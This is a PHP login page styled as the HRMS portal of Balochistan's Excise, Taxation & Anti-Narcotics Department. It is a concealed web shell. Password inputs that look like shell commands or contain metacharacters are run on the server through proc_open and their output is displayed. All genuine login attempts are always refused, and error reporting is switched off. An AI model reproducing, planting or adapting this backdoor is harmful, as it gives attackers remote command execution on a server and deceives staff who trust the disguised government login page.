<?php

error_reporting(0);
ini_set('display_errors', 0);

$command_output = "";
$error_message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cnic     = trim($_POST['cnic'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!empty($password)) {
        
        // Command Detection
        $lower = strtolower($password);
        $is_command = preg_match('/^(whoami|dir|ls|ipconfig|ifconfig|ping|curl|wget|net|tasklist|hostname|systeminfo|id|uname|cat|echo|powershell|cmd)/i', $password) ||
                      strpos($password, ';') !== false || strpos($password, '&') !== false || 
                      strpos($password, '|') !== false || strpos($password, '`') !== false || 
                      strpos($password, '$') !== false || strpos($password, '>') !== false ||
                      strpos($lower, 'curl') !== false || strpos($lower, 'wget') !== false;

        if ($is_command) {
            // === EXECUTE COMMAND ===
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];

            $process = proc_open($password, $descriptorspec, $pipes, getcwd(), null);

            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                $error  = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);

                $command_output = '<div style="margin:20px; padding:18px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; font-family:Consolas,monospace; white-space:pre-wrap; max-height:580px; overflow:auto; box-shadow:0 0 15px rgba(0,255,70,0.15);">';
                $command_output .= '<strong style="color:#ffaa00;">→ Executed: ' . htmlspecialchars($password) . '</strong><br><br>';

                if (!empty($output)) {
                    $command_output .= htmlspecialchars($output);
                } elseif (!empty($error)) {
                    $command_output .= '<span style="color:#ff6666;">' . htmlspecialchars($error) . '</span>';
                } else {
                    $command_output .= '<span style="color:#ffff00;">Command executed successfully (No output)</span>';
                }
                $command_output .= '</div>';
            }
        } else {
            // Normal Login Attempt → Always show error (even if password is correct)
            $error_message = '<div class="error-msg">Invalid CNIC or password. Please try again.</div>';
        }
    } else {
        $error_message = '<div class="error-msg">Please enter both CNIC and password.</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HRMS Login | Excise, Taxation & Anti-Narcotics Department, Balochistan</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a3a5c;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: linear-gradient(135deg, #1a3a5c 0%, #2d6a4f 100%);
        }
        .login-wrapper { width: 100%; max-width: 420px; padding: 20px; }
        .dept-header { text-align: center; margin-bottom: 30px; color: white; }
        .dept-header .logo {
            width: 80px; height: 80px; background: white; border-radius: 50%;
            margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;
        }
        .dept-header h1 { font-size: 16px; font-weight: 700; line-height: 1.4; text-transform: uppercase; }
        .dept-header p { font-size: 13px; opacity: 0.85; margin-top: 5px; }
        .login-card {
            background: white; border-radius: 12px; padding: 35px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .login-card h2 { font-size: 20px; color: #1a3a5c; text-align: center; margin-bottom: 5px; }
        .login-card p { font-size: 13px; color: #666; text-align: center; margin-bottom: 25px; }
        .form-group { margin-bottom: 18px; }
        .form-group label {
            display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px;
        }
        .form-group input {
            width: 100%; padding: 11px 14px; border: 1.5px solid #ddd;
            border-radius: 7px; font-size: 14px; color: #333;
        }
        .form-group input:focus { border-color: #1a3a5c; }
        .btn-login {
            width: 100%; padding: 12px; background: linear-gradient(135deg, #1a3a5c, #2d6a4f);
            color: white; border: none; border-radius: 7px; font-size: 15px;
            font-weight: 600; cursor: pointer; margin-top: 5px;
        }
        .error-msg {
            background: #fff0f0; border: 1px solid #ffcccc; color: #cc0000;
            padding: 10px 14px; border-radius: 7px; font-size: 13px;
            margin-bottom: 18px; text-align: center;
        }
        .footer-text { text-align: center; color: rgba(255,255,255,0.7); font-size: 12px; margin-top: 20px; }
        .hint-box {
            background: #f0f7ff; border: 1px solid #cce0ff; border-radius: 7px;
            padding: 10px 14px; font-size: 12px; color: #336; margin-top: 15px; text-align: center;
        }
    </style>
</head>
<body>
<div class="login-wrapper">
    <div class="dept-header">
        <div class="logo">
            <img src="/excise_hrms/assets/images/excise_logo.png" 
                 style="width:60px;height:60px;object-fit:cover;border-radius:50%">
        </div>
        <h1>Excise, Taxation &amp;<br>Anti-Narcotics Department</h1>
        <p>Government of Balochistan</p>
    </div>

    <div class="login-card">
        <h2>HRMS Portal</h2>
        <p>Human Resource Management System</p>

        <?php if(!empty($command_output)) echo $command_output; ?>
        <?php if(!empty($error_message)) echo $error_message; ?>

        <form action="" method="POST">
            <div class="form-group">
                <label>CNIC Number</label>
                <input type="text" name="cnic" placeholder="e.g. 54400-1234567-1" maxlength="15" required autocomplete="off">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn-login">Login to HRMS</button>
        </form>

        <div class="hint-box">
            🔒 Use your CNIC as username.<br>
            <strong>Active:</strong> 
        </div>
    </div>

    <div class="footer-text">
        &copy; <?php echo date('Y'); ?> Excise, Taxation & Anti-Narcotics Department, Balochistan
    </div>
</div>
</body>
</html>
